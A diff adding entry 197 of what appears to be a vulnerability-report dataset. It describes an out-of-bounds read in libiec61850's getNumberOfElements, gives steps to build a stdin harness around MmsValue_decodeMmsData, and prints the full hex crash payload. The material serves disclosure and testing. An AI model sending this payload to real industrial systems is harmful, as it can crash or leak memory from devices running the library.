@@ -1,0 +1,12 @@
+Number: 197
+
+Summarize:
+No affected version is specified in the report. The issue describes an out-of-bounds read in getNumberOfElements. According to the report, getNumberOfElements does not check the bufPos and elementLength arguments, allowing those values to become very large. The provided PoC feeds a supplied input buffer to MmsValue_decodeMmsData, and the report attributes the resulting out-of-bounds read to getNumberOfElements.
+
+Reproduce:
+1. Create the PoC program exactly as shown: it includes <libiec61850/mms_value.h>, declares uint8_t globalbuf[0x10000], reads input from file descriptor 0 with read(0, globalbuf, sizeof(globalbuf)), returns if readcount <= 0, and otherwise calls MmsValue_decodeMmsData(globalbuf, 0, (int)readcount, 0).
+2. Feed the program the exact long angle-bracket byte sequence from the report on stdin, starting with <a1><08><89><86><00><86><7f><ff><ff><ff><ff><e3> and ending with <00>.
+3. The report states that processing this input causes an out-of-bounds read in getNumberOfElements because bufPos and elementLength are not checked. The document does not include a specific crash trace, build command, or diagnostic output.
+
+Payload:
+a1 08 89 86 00 86 7f ff ff ff ff e3 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff e6 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ac ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 00 64 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff bf ff ff ff ff ff ff ff ff ff e4 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 00
